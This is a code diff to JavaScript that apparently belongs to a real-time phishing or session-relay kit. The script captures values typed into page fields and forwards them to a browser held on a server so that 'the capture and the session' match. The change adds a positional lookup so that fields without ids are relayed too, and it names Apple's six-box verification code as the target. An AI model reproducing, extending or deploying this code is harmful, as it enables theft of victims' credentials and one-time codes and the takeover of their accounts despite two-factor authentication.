@@ -264,11 +264,47 @@
     send({ t: "value", key: now.key, value: now.value, checked: now.checked });
 
     // The same word goes to the browser the server holds, so the capture and
-    // the session stay the same thing. Only an element the browser can be
-    // told about - one with an id - is worth a message.
+    // the session stay the same thing.
     if (el.id) {
       send({ t: "field", id: el.id, value: now.value, checked: now.checked });
+      return;
     }
+
+    // No id: the browser can still be told, by what the control is and how
+    // many of them there are. Apple's verification code boxes have no ids
+    // at all - six inputs - and the third one is the third one in the real
+    // page too.
+    var place = placeOf(el);
+    if (place) {
+      send({
+        t: "field",
+        id: "",
+        tag: place.tag,
+        n: place.n,
+        of: place.of,
+        value: now.value,
+        checked: now.checked,
+      });
+    }
+  }
+
+  // Where a control sits among the ones like it: the third input of the
+  // document, and how many inputs it has.
+  function placeOf(el) {
+    var doc = el.ownerDocument || document;
+    var tag = (el.tagName || "").toLowerCase();
+    if (!tag || !doc.getElementsByTagName) return null;
+
+    var all = doc.getElementsByTagName(tag);
+    var n = 0;
+    for (var i = 0; i < all.length; i++) {
+      if (all[i] === el) {
+        n = i + 1;
+        break;
+      }
+    }
+    if (!n) return null;
+    return { tag: tag, n: n, of: all.length };
   }
 
   function onFieldEvent(event) {
